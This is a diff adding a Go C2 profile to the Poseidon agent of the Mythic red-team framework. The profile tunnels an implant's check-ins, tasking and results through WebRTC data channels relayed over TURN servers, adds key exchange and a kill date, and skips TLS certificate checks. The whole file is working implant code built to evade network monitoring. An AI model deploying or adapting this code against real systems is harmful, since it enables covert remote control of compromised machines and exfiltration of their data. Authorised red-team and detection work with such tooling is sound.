@@ -1,0 +1,864 @@
+//go:build (linux || darwin) && turnc2
+
+package profiles
+
+import (
+	"bytes"
+	"crypto/rsa"
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"strconv"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/andybalholm/brotli"
+	"github.com/pion/ice/v2"
+	pion "github.com/pion/webrtc/v3"
+
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
+)
+
+// turnc2_initial_config is set at compile time via ldflags
+var turnc2_initial_config string
+
+type Turnc2InitialConfig struct {
+	CallbackHost           string
+	CallbackPort           uint
+	SignalURI              string
+	TurnServer             string
+	TurnUsername           string
+	TurnPassword           string
+	SDPOffer               string
+	OfferID                string
+	Killdate               string
+	Interval               uint
+	Jitter                 uint
+	EncryptedExchangeCheck bool
+	AESPSK                 string
+}
+
+func (e *Turnc2InitialConfig) UnmarshalJSON(data []byte) error {
+	alias := map[string]interface{}{}
+	err := json.Unmarshal(data, &alias)
+	if err != nil {
+		return err
+	}
+	if v, ok := alias["callback_host"]; ok {
+		e.CallbackHost = v.(string)
+	}
+	if v, ok := alias["callback_port"]; ok {
+		e.CallbackPort = uint(v.(float64))
+	}
+	if v, ok := alias["signal_uri"]; ok {
+		e.SignalURI = v.(string)
+	}
+	if v, ok := alias["turn_server"]; ok {
+		e.TurnServer = v.(string)
+	}
+	if v, ok := alias["turn_username"]; ok {
+		e.TurnUsername = v.(string)
+	}
+	if v, ok := alias["turn_password"]; ok {
+		e.TurnPassword = v.(string)
+	}
+	if v, ok := alias["sdp_offer"]; ok {
+		e.SDPOffer = v.(string)
+	}
+	if v, ok := alias["offer_id"]; ok {
+		e.OfferID = v.(string)
+	}
+	if v, ok := alias["killdate"]; ok {
+		e.Killdate = v.(string)
+	}
+	if v, ok := alias["callback_interval"]; ok {
+		e.Interval = uint(v.(float64))
+	}
+	if v, ok := alias["callback_jitter"]; ok {
+		e.Jitter = uint(v.(float64))
+	}
+	if v, ok := alias["encrypted_exchange_check"]; ok {
+		e.EncryptedExchangeCheck = v.(bool)
+	}
+	if v, ok := alias["AESPSK"]; ok {
+		e.AESPSK = v.(string)
+	}
+	return nil
+}
+
+// OfferPayload is the decoded SDP offer from the server
+type OfferPayload struct {
+	OfferSDP   string           `json:"offer_sdp"`
+	ICEServers []pion.ICEServer `json:"ice_servers"`
+}
+
+type C2Turnc2 struct {
+	SignalURL             string
+	SignalURI             string
+	TurnServer            string
+	TurnUsername           string
+	TurnPassword          string
+	SDPOffer              string
+	OfferID               string
+	Interval              int
+	Jitter                int
+	ExchangingKeys        bool
+	Key                   string
+	RsaPrivateKey         *rsa.PrivateKey
+	PeerConn              *pion.PeerConnection
+	DataChan              *pion.DataChannel
+	Lock                  sync.RWMutex
+	ReconnectLock         sync.RWMutex
+	Killdate              time.Time
+	FinishedStaging       bool
+	ShouldStop            bool
+	stoppedChannel        chan bool
+	PushChannel           chan structs.MythicMessage
+	interruptSleepChannel chan bool
+	// channel to receive messages from the data channel
+	recvChannel           chan []byte
+	// channel to signal data channel is open
+	dataChannelReady      chan bool
+}
+
+func (c *C2Turnc2) MarshalJSON() ([]byte, error) {
+	alias := map[string]interface{}{
+		"SignalURL":     c.SignalURL,
+		"SignalURI":     c.SignalURI,
+		"TurnServer":   c.TurnServer,
+		"Interval":     c.Interval,
+		"Jitter":       c.Jitter,
+		"EncryptionKey": c.Key,
+		"KillDate":     c.Killdate,
+	}
+	return json.Marshal(alias)
+}
+
+func init() {
+	initialConfigBytes, err := base64.StdEncoding.DecodeString(turnc2_initial_config)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to decode initial turnc2 config, exiting: %v\n", err))
+		os.Exit(1)
+	}
+	initialConfig := Turnc2InitialConfig{}
+	err = json.Unmarshal(initialConfigBytes, &initialConfig)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial turnc2 config, exiting: %v\n", err))
+		os.Exit(1)
+	}
+
+	// Build the signaling URL
+	var signalURL string
+	if initialConfig.CallbackPort == 443 && strings.Contains(initialConfig.CallbackHost, "https://") {
+		signalURL = initialConfig.CallbackHost
+	} else if initialConfig.CallbackPort == 80 && strings.Contains(initialConfig.CallbackHost, "http://") {
+		signalURL = initialConfig.CallbackHost
+	} else {
+		signalURL = fmt.Sprintf("%s:%d", initialConfig.CallbackHost, initialConfig.CallbackPort)
+	}
+	// Remove trailing slash if present
+	signalURL = strings.TrimRight(signalURL, "/")
+
+	profile := C2Turnc2{
+		SignalURL:             signalURL,
+		SignalURI:             initialConfig.SignalURI,
+		TurnServer:            initialConfig.TurnServer,
+		TurnUsername:          initialConfig.TurnUsername,
+		TurnPassword:          initialConfig.TurnPassword,
+		SDPOffer:              initialConfig.SDPOffer,
+		OfferID:               initialConfig.OfferID,
+		Key:                   initialConfig.AESPSK,
+		ShouldStop:            true,
+		stoppedChannel:        make(chan bool, 1),
+		PushChannel:           make(chan structs.MythicMessage, 100),
+		interruptSleepChannel: make(chan bool, 1),
+		recvChannel:           make(chan []byte, 100),
+		dataChannelReady:      make(chan bool, 1),
+	}
+
+	profile.Interval = int(initialConfig.Interval)
+	if profile.Interval < 0 {
+		profile.Interval = 0
+	}
+	profile.Jitter = int(initialConfig.Jitter)
+	if profile.Jitter < 0 {
+		profile.Jitter = 0
+	}
+
+	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
+
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
+	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
+	if err != nil {
+		os.Exit(1)
+	}
+	profile.Killdate = killDateTime
+
+	RegisterAvailableC2Profile(&profile)
+	go profile.CreateMessagesForEgressConnections()
+}
+
+func (c *C2Turnc2) ProfileName() string {
+	return "turnc2"
+}
+
+func (c *C2Turnc2) IsP2P() bool {
+	return false
+}
+
+func (c *C2Turnc2) IsRunning() bool {
+	return !c.ShouldStop
+}
+
+func (c *C2Turnc2) GetPushChannel() chan structs.MythicMessage {
+	if !c.ShouldStop {
+		return c.PushChannel
+	}
+	return nil
+}
+
+func (c *C2Turnc2) GetSleepTime() int {
+	if c.ShouldStop {
+		return -1
+	}
+	return 0 // push-based, no sleep needed
+}
+
+func (c *C2Turnc2) GetSleepInterval() int {
+	return c.Interval
+}
+
+func (c *C2Turnc2) GetSleepJitter() int {
+	return c.Jitter
+}
+
+func (c *C2Turnc2) GetKillDate() time.Time {
+	return c.Killdate
+}
+
+func (c *C2Turnc2) SetSleepInterval(interval int) string {
+	return fmt.Sprintf("Sleep interval not used for Push style C2 Profile\n")
+}
+
+func (c *C2Turnc2) SetSleepJitter(jitter int) string {
+	return fmt.Sprintf("Jitter interval not used for Push style C2 Profile\n")
+}
+
+func (c *C2Turnc2) Sleep() {
+	select {
+	case <-c.interruptSleepChannel:
+	case <-time.After(time.Second * time.Duration(c.Interval)):
+	}
+}
+
+func (c *C2Turnc2) GetConfig() string {
+	jsonString, err := json.MarshalIndent(c, "", "  ")
+	if err != nil {
+		return fmt.Sprintf("Failed to get config: %v\n", err)
+	}
+	return string(jsonString)
+}
+
+func (c *C2Turnc2) SetEncryptionKey(newKey string) {
+	c.Key = newKey
+	c.ExchangingKeys = false
+}
+
+func (c *C2Turnc2) UpdateConfig(parameter string, value string) {
+	changingConnectionParameter := false
+	switch parameter {
+	case "SignalURL":
+		c.SignalURL = value
+		changingConnectionParameter = true
+	case "SignalURI":
+		c.SignalURI = value
+		changingConnectionParameter = true
+	case "TurnServer":
+		c.TurnServer = value
+		changingConnectionParameter = true
+	case "TurnUsername":
+		c.TurnUsername = value
+		changingConnectionParameter = true
+	case "TurnPassword":
+		c.TurnPassword = value
+		changingConnectionParameter = true
+	case "Interval":
+		newInt, err := strconv.Atoi(value)
+		if err == nil {
+			c.Interval = newInt
+		}
+	case "Jitter":
+		newInt, err := strconv.Atoi(value)
+		if err == nil {
+			c.Jitter = newInt
+		}
+	case "EncryptionKey":
+		c.Key = value
+		SetAllEncryptionKeys(c.Key)
+	case "Killdate":
+		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
+		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
+		if err == nil {
+			c.Killdate = killDateTime
+		}
+	}
+	if changingConnectionParameter {
+		c.Stop()
+		go c.Start()
+	}
+}
+
+func (c *C2Turnc2) Start() {
+	if !c.ShouldStop {
+		return
+	}
+	c.ShouldStop = false
+	go c.CheckForKillDate()
+	c.getData()
+}
+
+func (c *C2Turnc2) Stop() {
+	if c.ShouldStop {
+		return
+	}
+	c.ShouldStop = true
+	if c.PeerConn != nil {
+		c.PeerConn.Close()
+	}
+	utils.PrintDebug(fmt.Sprintf("issued stop to turnc2\n"))
+	<-c.stoppedChannel
+	utils.PrintDebug(fmt.Sprintf("turnc2 fully stopped\n"))
+}
+
+func (c *C2Turnc2) CheckForKillDate() {
+	for {
+		if c.ShouldStop {
+			return
+		}
+		time.Sleep(time.Duration(60) * time.Second)
+		today := time.Now()
+		if today.After(c.Killdate) {
+			os.Exit(1)
+		}
+	}
+}
+
+// establishWebRTC decodes the stamped SDP offer and sets up the WebRTC peer connection
+func (c *C2Turnc2) establishWebRTC() error {
+	if c.SDPOffer == "" {
+		return fmt.Errorf("no SDP offer configured")
+	}
+
+	// Decode the stamped offer (Brotli + Base64 → JSON)
+	decompressed, err := decompressBase64(c.SDPOffer)
+	if err != nil {
+		return fmt.Errorf("failed to decompress SDP offer: %w", err)
+	}
+
+	var offerPayload OfferPayload
+	if err := json.Unmarshal(decompressed, &offerPayload); err != nil {
+		return fmt.Errorf("failed to parse SDP offer: %w", err)
+	}
+
+	if offerPayload.OfferSDP == "" {
+		return fmt.Errorf("SDP offer payload missing offer_sdp")
+	}
+
+	// Configure ICE servers - use the ones from the offer if available, otherwise use config
+	iceServers := offerPayload.ICEServers
+	if len(iceServers) == 0 && c.TurnServer != "" {
+		iceServers = []pion.ICEServer{
+			{
+				URLs:       []string{c.TurnServer},
+				Username:   c.TurnUsername,
+				Credential: c.TurnPassword,
+			},
+		}
+	}
+
+	settingEngine := pion.SettingEngine{}
+	settingEngine.SetICEMulticastDNSMode(ice.MulticastDNSModeDisabled)
+	settingEngine.SetNetworkTypes([]pion.NetworkType{
+		pion.NetworkTypeTCP4,
+		pion.NetworkTypeTCP6,
+	})
+	settingEngine.SetICETimeouts(
+		30*time.Second, // disconnected timeout
+		5*time.Minute,  // failed timeout
+		10*time.Second, // keepalive interval
+	)
+
+	api := pion.NewAPI(pion.WithSettingEngine(settingEngine))
+
+	rtcConfig := pion.Configuration{
+		ICEServers:         iceServers,
+		ICETransportPolicy: pion.ICETransportPolicyRelay,
+	}
+
+	pc, err := api.NewPeerConnection(rtcConfig)
+	if err != nil {
+		return fmt.Errorf("failed to create peer connection: %w", err)
+	}
+
+	// Reset channels for new connection
+	c.recvChannel = make(chan []byte, 100)
+	c.dataChannelReady = make(chan bool, 1)
+
+	// Set up data channel handler
+	pc.OnDataChannel(func(dc *pion.DataChannel) {
+		utils.PrintDebug(fmt.Sprintf("data channel received: %s\n", dc.Label()))
+		c.DataChan = dc
+
+		dc.OnOpen(func() {
+			utils.PrintDebug(fmt.Sprintf("data channel open: %s\n", dc.Label()))
+			select {
+			case c.dataChannelReady <- true:
+			default:
+			}
+		})
+
+		dc.OnMessage(func(msg pion.DataChannelMessage) {
+			if !c.ShouldStop {
+				c.recvChannel <- msg.Data
+			}
+		})
+
+		dc.OnClose(func() {
+			utils.PrintDebug(fmt.Sprintf("data channel closed\n"))
+		})
+	})
+
+	// Monitor connection state
+	pc.OnConnectionStateChange(func(state pion.PeerConnectionState) {
+		utils.PrintDebug(fmt.Sprintf("WebRTC connection state: %s\n", state.String()))
+		switch state {
+		case pion.PeerConnectionStateDisconnected, pion.PeerConnectionStateFailed, pion.PeerConnectionStateClosed:
+			if !c.ShouldStop {
+				utils.PrintDebug(fmt.Sprintf("WebRTC connection lost, will reconnect\n"))
+			}
+		}
+	})
+
+	// Set the remote description (offer from server)
+	remoteSDP := pion.SessionDescription{
+		Type: pion.SDPTypeOffer,
+		SDP:  offerPayload.OfferSDP,
+	}
+	if err := pc.SetRemoteDescription(remoteSDP); err != nil {
+		pc.Close()
+		return fmt.Errorf("failed to set remote description: %w", err)
+	}
+
+	// Create answer
+	answer, err := pc.CreateAnswer(nil)
+	if err != nil {
+		pc.Close()
+		return fmt.Errorf("failed to create answer: %w", err)
+	}
+
+	if err := pc.SetLocalDescription(answer); err != nil {
+		pc.Close()
+		return fmt.Errorf("failed to set local description: %w", err)
+	}
+
+	// Wait for ICE gathering to complete
+	gatherComplete := pion.GatheringCompletePromise(pc)
+	<-gatherComplete
+
+	// Get the final answer with ICE candidates
+	finalAnswer := pc.LocalDescription()
+
+	// Compress and encode the answer SDP
+	compressedAnswer, err := compressBase64([]byte(finalAnswer.SDP))
+	if err != nil {
+		pc.Close()
+		return fmt.Errorf("failed to compress answer: %w", err)
+	}
+
+	// Send the answer back to the signaling server with the offer_id
+	if err := c.sendSignalingAnswer(c.OfferID, compressedAnswer); err != nil {
+		pc.Close()
+		return fmt.Errorf("failed to send signaling answer: %w", err)
+	}
+
+	c.PeerConn = pc
+
+	// Wait for data channel to be ready
+	select {
+	case <-c.dataChannelReady:
+		utils.PrintDebug("data channel ready\n")
+	case <-time.After(30 * time.Second):
+		pc.Close()
+		return fmt.Errorf("timed out waiting for data channel")
+	}
+
+	return nil
+}
+
+// sendSignalingAnswer POSTs the compressed SDP answer to the signaling endpoint
+func (c *C2Turnc2) sendSignalingAnswer(offerID string, compressedAnswer string) error {
+	url := fmt.Sprintf("%s%s", c.SignalURL, c.SignalURI)
+
+	sigReq := struct {
+		OfferID string `json:"offer_id"`
+		Answer  string `json:"answer"`
+	}{
+		OfferID: offerID,
+		Answer:  compressedAnswer,
+	}
+
+	reqBody, err := json.Marshal(sigReq)
+	if err != nil {
+		return fmt.Errorf("failed to marshal signaling request: %w", err)
+	}
+
+	req, err := http.NewRequest("POST", url, bytes.NewReader(reqBody))
+	if err != nil {
+		return fmt.Errorf("failed to create request: %w", err)
+	}
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := c.httpClient().Do(req)
+	if err != nil {
+		return fmt.Errorf("signaling request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("signaling server returned %d: %s", resp.StatusCode, string(body))
+	}
+
+	utils.PrintDebug("signaling answer sent successfully\n")
+	return nil
+}
+
+func (c *C2Turnc2) httpClient() *http.Client {
+	return &http.Client{
+		Timeout: 30 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true,
+			},
+		},
+	}
+}
+
+// reconnect tears down the existing connection and establishes a new one
+func (c *C2Turnc2) reconnect() {
+	if c.ShouldStop {
+		return
+	}
+	c.ReconnectLock.Lock()
+	defer c.ReconnectLock.Unlock()
+
+	if c.PeerConn != nil {
+		c.PeerConn.Close()
+		c.PeerConn = nil
+	}
+	c.DataChan = nil
+
+	for {
+		if c.ShouldStop {
+			return
+		}
+		utils.PrintDebug("attempting WebRTC reconnection\n")
+		if err := c.establishWebRTC(); err != nil {
+			utils.PrintDebug(fmt.Sprintf("reconnect failed: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(1 * time.Second)
+			continue
+		}
+		utils.PrintDebug("WebRTC reconnected successfully\n")
+
+		if c.FinishedStaging {
+			go c.CheckIn()
+		} else if c.ExchangingKeys {
+			go c.NegotiateKey()
+		} else {
+			go c.CheckIn()
+		}
+		break
+	}
+}
+
+func (c *C2Turnc2) CheckIn() structs.CheckInMessageResponse {
+	checkin := CreateCheckinMessage()
+	checkinMsg, err := json.Marshal(checkin)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to marshal checkin data\n"))
+	}
+	for {
+		if c.ShouldStop {
+			return structs.CheckInMessageResponse{}
+		}
+		if c.ExchangingKeys {
+			for !c.NegotiateKey() {
+				utils.PrintDebug(fmt.Sprintf("failed to negotiate key, trying again\n"))
+				if c.ShouldStop {
+					return structs.CheckInMessageResponse{}
+				}
+			}
+		}
+		c.SendMessage(checkinMsg)
+		// Push-based: response comes via getData()
+		return structs.CheckInMessageResponse{}
+	}
+}
+
+func (c *C2Turnc2) NegotiateKey() bool {
+	sessionID := utils.GenerateSessionID()
+	pub, priv := crypto.GenerateRSAKeyPair()
+	c.RsaPrivateKey = priv
+	initMessage := structs.EkeKeyExchangeMessage{}
+	initMessage.Action = "staging_rsa"
+	initMessage.SessionID = sessionID
+	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
+
+	raw, err := json.Marshal(initMessage)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("Error marshaling data: %s", err.Error()))
+		return false
+	}
+	c.SendMessage(raw)
+	// Push-based: response comes via getData()
+	return true
+}
+
+func (c *C2Turnc2) FinishNegotiateKey(resp []byte) bool {
+	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
+	err := json.Unmarshal(resp, &sessionKeyResp)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
+		return false
+	}
+	if len(sessionKeyResp.UUID) > 0 {
+		SetMythicID(sessionKeyResp.UUID)
+	} else {
+		return false
+	}
+	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
+	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
+	c.Key = base64.StdEncoding.EncodeToString(decryptedKey)
+	c.ExchangingKeys = false
+	SetAllEncryptionKeys(c.Key)
+	return true
+}
+
+// SendMessage encrypts, prepends UUID, base64 encodes, and sends over the data channel
+func (c *C2Turnc2) SendMessage(output []byte) []byte {
+	if c.ShouldStop {
+		return nil
+	}
+	c.Lock.Lock()
+	defer c.Lock.Unlock()
+
+	if len(c.Key) != 0 {
+		output = c.encryptMessage(output)
+	}
+
+	if GetMythicID() != "" {
+		output = append([]byte(GetMythicID()), output...)
+	} else {
+		output = append([]byte(UUID), output...)
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(output)
+
+	for i := 0; i < 5; i++ {
+		if c.ShouldStop {
+			return nil
+		}
+		if c.DataChan == nil || c.DataChan.ReadyState() != pion.DataChannelStateOpen {
+			c.reconnect()
+			if c.ShouldStop {
+				return nil
+			}
+		}
+
+		today := time.Now()
+		if today.After(c.Killdate) {
+			os.Exit(1)
+		}
+
+		if err := c.DataChan.SendText(encoded); err != nil {
+			utils.PrintDebug(fmt.Sprintf("Error sending data over data channel: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(1 * time.Second)
+			continue
+		}
+		return nil
+	}
+	return nil
+}
+
+// CreateMessagesForEgressConnections drains the PushChannel and sends messages out
+func (c *C2Turnc2) CreateMessagesForEgressConnections() {
+	for {
+		msg := <-c.PushChannel
+		raw, err := json.Marshal(msg)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
+			continue
+		}
+		c.SendMessage(raw)
+	}
+}
+
+// getData reads messages from the WebRTC data channel and processes them
+func (c *C2Turnc2) getData() {
+	defer func() {
+		c.stoppedChannel <- true
+	}()
+
+	// Establish the initial WebRTC connection
+	for {
+		if c.ShouldStop {
+			return
+		}
+		if err := c.establishWebRTC(); err != nil {
+			utils.PrintDebug(fmt.Sprintf("Failed to establish WebRTC: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(1 * time.Second)
+			continue
+		}
+		break
+	}
+
+	// Send initial checkin or start key exchange
+	if c.ExchangingKeys {
+		c.NegotiateKey()
+	} else {
+		c.CheckIn()
+	}
+
+	for {
+		if c.ShouldStop {
+			return
+		}
+
+		var rawData []byte
+		select {
+		case data, ok := <-c.recvChannel:
+			if !ok {
+				if c.ShouldStop {
+					return
+				}
+				c.reconnect()
+				continue
+			}
+			rawData = data
+		case <-time.After(5 * time.Minute):
+			// timeout - check if we should stop
+			if c.ShouldStop {
+				return
+			}
+			continue
+		}
+
+		if c.ShouldStop {
+			return
+		}
+
+		// The data from the channel may be raw or base64 encoded
+		// Try base64 decode first
+		raw, err := base64.StdEncoding.DecodeString(string(rawData))
+		if err != nil {
+			// If not base64, use raw bytes
+			raw = rawData
+		}
+
+		if len(raw) < 36 {
+			utils.PrintDebug(fmt.Sprintf("length of data < 36\n"))
+			continue
+		}
+
+		encRaw := raw[36:] // Remove the UUID prefix
+
+		if len(c.Key) != 0 {
+			encRaw = c.decryptMessage(encRaw)
+			if len(encRaw) == 0 {
+				if c.ShouldStop {
+					return
+				}
+				IncrementFailedConnection(c.ProfileName())
+				c.reconnect()
+				time.Sleep(1 * time.Second)
+				continue
+			}
+		}
+
+		if c.FinishedStaging {
+			taskResp := structs.MythicMessageResponse{}
+			err = json.Unmarshal(encRaw, &taskResp)
+			if err != nil {
+				utils.PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v\n", err))
+			}
+			responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
+		} else {
+			if c.ExchangingKeys {
+				if c.FinishNegotiateKey(encRaw) {
+					c.CheckIn()
+				} else {
+					c.NegotiateKey()
+				}
+			} else {
+				// Should be the result of CheckIn
+				checkinResp := structs.CheckInMessageResponse{}
+				err = json.Unmarshal(encRaw, &checkinResp)
+				if checkinResp.Status == "success" {
+					SetMythicID(checkinResp.ID)
+					c.FinishedStaging = true
+					c.ExchangingKeys = false
+				} else {
+					utils.PrintDebug(fmt.Sprintf("Failed to checkin, got a weird message: %s\n", string(encRaw)))
+				}
+				utils.PrintDebug("adding missed poll messages to push messages")
+				missedMessages := responses.CreateMythicPollMessage()
+				c.PushChannel <- *missedMessages
+				utils.PrintDebug("added missed poll messages")
+			}
+		}
+	}
+}
+
+func (c *C2Turnc2) encryptMessage(msg []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	return crypto.AesEncrypt(key, msg)
+}
+
+func (c *C2Turnc2) decryptMessage(msg []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	return crypto.AesDecrypt(key, msg)
+}
+
+// Brotli compression utilities
+
+func compressBase64(input []byte) (string, error) {
+	var buf bytes.Buffer
+	writer := brotli.NewWriter(&buf)
+	if _, err := writer.Write(input); err != nil {
+		return "", err
+	}
+	if err := writer.Close(); err != nil {
+		return "", err
+	}
+	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
+}
+
+func decompressBase64(input string) ([]byte, error) {
+	decoded, err := base64.StdEncoding.DecodeString(input)
+	if err != nil {
+		return nil, err
+	}
+	reader := brotli.NewReader(bytes.NewReader(decoded))
+	return io.ReadAll(reader)
+}
